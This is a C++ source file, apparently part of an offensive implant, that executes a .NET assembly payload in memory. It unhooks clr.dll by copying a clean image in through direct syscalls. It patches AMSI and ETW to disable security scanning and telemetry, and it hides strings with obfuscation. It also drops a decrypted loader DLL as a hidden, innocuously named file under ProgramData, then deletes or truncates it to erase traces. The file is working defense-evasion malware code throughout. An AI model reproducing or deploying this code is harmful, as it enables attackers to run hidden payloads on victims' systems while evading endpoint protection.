#include "clr.h"
#include "peb_walk.h"
#include "hash.h"
#include "obfstr.h"
#include "syscalls.h"
#include "amsi.h"
#include "etw.h"
#include <cstring>

#include <metahost.h>
#include <mscoree.h>

#include "miniloader_bytes.h"

static const GUID CLSID_CLRMetaHost_local =
    { 0x9280188D, 0x0E8E, 0x4867, { 0xB3, 0x0C, 0x7F, 0xA8, 0x38, 0x84, 0xE8, 0xDE } };
static const GUID IID_ICLRMetaHost_local =
    { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
static const GUID IID_ICLRRuntimeInfo_local =
    { 0xBD39D1D2, 0xBA2F, 0x486A, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
static const GUID CLSID_CLRRuntimeHost_local =
    { 0x90F1A06E, 0x7712, 0x4762, { 0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02 } };
static const GUID IID_ICLRRuntimeHost_local =
    { 0x90F1A06C, 0x7712, 0x4762, { 0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02 } };

static void unhook_clr_module() {
    HMODULE hClr = nullptr;
    auto clrName = OBFWSTR(L"clr.dll");
    hClr = GetModuleHandleW(clrName.c_str());
    if (!hClr) return;

    UNICODE_STRING clrPath;
    wchar_t pathBuf[MAX_PATH] = {};
    auto sysRoot = OBFWSTR(L"\\SystemRoot\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll");
    wcscpy_s(pathBuf, sysRoot.c_str());
    g_apis.pRtlInitUnicodeString(&clrPath, pathBuf);

    OBJECT_ATTRIBUTES oa = {};
    InitializeObjectAttributes(&oa, &clrPath, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
    IO_STATUS_BLOCK iosb = {};

    HANDLE hFile = nullptr;
    NTSTATUS st = sc_NtOpenFile(&hFile, FILE_READ_DATA | SYNCHRONIZE, &oa, &iosb,
        FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
    if (st != 0 || !hFile) return;

    HANDLE hSection = nullptr;
    st = sc_NtCreateSection(&hSection, SECTION_MAP_READ, nullptr, nullptr,
        PAGE_READONLY, SEC_IMAGE, hFile);
    sc_NtClose(hFile);
    if (st != 0 || !hSection) return;

    PVOID cleanBase = nullptr;
    SIZE_T viewSize = 0;
    st = sc_NtMapViewOfSection(hSection, (HANDLE)-1, &cleanBase, 0, 0,
        nullptr, &viewSize, 1, 0, PAGE_READONLY);
    sc_NtClose(hSection);
    if (st != 0 || !cleanBase) return;

    IMAGE_DOS_HEADER* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(hClr);
    IMAGE_NT_HEADERS* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(
        reinterpret_cast<uint8_t*>(hClr) + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            uint8_t* srcText = reinterpret_cast<uint8_t*>(cleanBase) + sections[i].VirtualAddress;
            uint8_t* dstText = reinterpret_cast<uint8_t*>(hClr) + sections[i].VirtualAddress;
            SIZE_T textSize = sections[i].Misc.VirtualSize;

            PVOID protAddr = dstText;
            SIZE_T protSize = textSize;
            ULONG oldProtect = 0;
            st = sc_NtProtectVirtualMemory((HANDLE)-1, &protAddr, &protSize,
                PAGE_EXECUTE_READWRITE, &oldProtect);
            if (st == 0) {
                memcpy(dstText, srcText, textSize);
                sc_NtProtectVirtualMemory((HANDLE)-1, &protAddr, &protSize,
                    oldProtect, &oldProtect);
            }
            break;
        }
    }

    sc_NtUnmapViewOfSection((HANDLE)-1, cleanBase);
}

bool execute_assembly(unsigned char* payload, size_t payload_size,
                      const char** args, int argc) {

    ICLRMetaHost* pMetaHost = nullptr;
    HRESULT hr = g_apis.pCLRCreateInstance(CLSID_CLRMetaHost_local, IID_ICLRMetaHost_local,
        reinterpret_cast<LPVOID*>(&pMetaHost));
    if (FAILED(hr) || !pMetaHost) return false;

    ICLRRuntimeInfo* pRuntimeInfo = nullptr;
    auto version = OBFWSTR(L"v4.0.30319");
    hr = pMetaHost->GetRuntime(version.c_str(), IID_ICLRRuntimeInfo_local,
        reinterpret_cast<LPVOID*>(&pRuntimeInfo));
    if (FAILED(hr) || !pRuntimeInfo) {
        pMetaHost->Release();
        return false;
    }

    ICLRRuntimeHost* pCLRHost = nullptr;
    hr = pRuntimeInfo->GetInterface(CLSID_CLRRuntimeHost_local,
        IID_ICLRRuntimeHost_local, reinterpret_cast<LPVOID*>(&pCLRHost));
    if (FAILED(hr) || !pCLRHost) {
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return false;
    }

    hr = pCLRHost->Start();
    if (FAILED(hr) && hr != S_FALSE) {
        pCLRHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return false;
    }

    Sleep(200 + (GetTickCount() % 800));

    unhook_clr_module();

    resolve_phase5_amsi();
    if (g_apis.pAmsiScanBuffer) patch_amsi_bypass();
    patch_etw_bypass();

    char mmfName[64] = {};
    auto mmfFmt = OBFSTR("Local\\SM0-%lu-%lu");
    snprintf(mmfName, sizeof(mmfName), mmfFmt.c_str(),
        GetCurrentProcessId(), GetTickCount());

    HANDLE hMapFile = CreateFileMappingA(INVALID_HANDLE_VALUE, nullptr,
        PAGE_READWRITE, 0, static_cast<DWORD>(payload_size), mmfName);
    if (!hMapFile) {
        pCLRHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return false;
    }

    void* pBuf = MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, payload_size);
    if (!pBuf) {
        CloseHandle(hMapFile);
        pCLRHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return false;
    }
    memcpy(pBuf, payload, payload_size);

    wchar_t loaderPath[MAX_PATH] = {};
    DWORD tick = GetTickCount();
    wchar_t loaderName[64] = {};
    swprintf_s(loaderName, L"msil_cfg_%08x.dll", tick);

    wchar_t pdDir[MAX_PATH] = {};
    if (GetEnvironmentVariableW(L"ProgramData", pdDir, MAX_PATH) > 0) {
        swprintf_s(loaderPath, L"%ls\\Microsoft\\Crypto\\%ls", pdDir, loaderName);
    }

    HANDLE hLoader = INVALID_HANDLE_VALUE;
    if (loaderPath[0]) {
        hLoader = CreateFileW(loaderPath, GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN, nullptr);
    }

    if (hLoader == INVALID_HANDLE_VALUE) {
        wchar_t exePath[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, exePath, MAX_PATH);
        wchar_t* lastSlash = wcsrchr(exePath, L'\\');
        if (lastSlash) *(lastSlash + 1) = L'\0';
        swprintf_s(loaderPath, L"%ls%ls", exePath, loaderName);
        hLoader = CreateFileW(loaderPath, GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    }

    if (hLoader == INVALID_HANDLE_VALUE) {
        wchar_t tempDir[MAX_PATH] = {};
        GetTempPathW(MAX_PATH, tempDir);
        swprintf_s(loaderPath, L"%ls%ls", tempDir, loaderName);
        hLoader = CreateFileW(loaderPath, GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    }
    if (hLoader == INVALID_HANDLE_VALUE) {
        UnmapViewOfFile(pBuf);
        CloseHandle(hMapFile);
        pCLRHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return false;
    }

    unsigned char* decrypted_dll = new unsigned char[g_miniloader_dll_size];
    decrypt_miniloader(decrypted_dll, g_miniloader_dll_xor, g_miniloader_dll_size);

    DWORD written = 0;
    WriteFile(hLoader, decrypted_dll, g_miniloader_dll_size, &written, nullptr);
    CloseHandle(hLoader);

    volatile unsigned char* vd = reinterpret_cast<volatile unsigned char*>(decrypted_dll);
    for (unsigned int i = 0; i < g_miniloader_dll_size; i++) vd[i] = 0;
    delete[] decrypted_dll;

    char argBuf[4096] = {};
    int pos = snprintf(argBuf, sizeof(argBuf), "%s|%zu", mmfName, payload_size);
    for (int i = 0; i < argc && pos < (int)sizeof(argBuf) - 256; i++) {
        pos += snprintf(argBuf + pos, sizeof(argBuf) - pos, "|%s", args[i]);
    }

    wchar_t wArgBuf[4096] = {};
    MultiByteToWideChar(CP_ACP, 0, argBuf, -1, wArgBuf, 4096);

    auto typeName = OBFWSTR(L"Loader");
    auto methodName = OBFWSTR(L"Execute");

    DWORD retVal = 0;
    hr = pCLRHost->ExecuteInDefaultAppDomain(loaderPath,
        typeName.c_str(), methodName.c_str(), wArgBuf, &retVal);

    restore_amsi_bypass();
    restore_etw_bypass();

    pCLRHost->Stop();
    pCLRHost->Release();
    pRuntimeInfo->Release();
    pMetaHost->Release();
    UnmapViewOfFile(pBuf);
    CloseHandle(hMapFile);

    bool deleted = false;
    for (int d = 0; d < 20; d++) {
        if (DeleteFileW(loaderPath)) { deleted = true; break; }
        Sleep(250);
    }
    if (!deleted) {
        HANDLE hZ = CreateFileW(loaderPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hZ != INVALID_HANDLE_VALUE) {
            SetFilePointer(hZ, 0, nullptr, FILE_BEGIN);
            SetEndOfFile(hZ);
            CloseHandle(hZ);
        }
        MoveFileExW(loaderPath, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
    }

    return SUCCEEDED(hr) && retVal == 0;
}
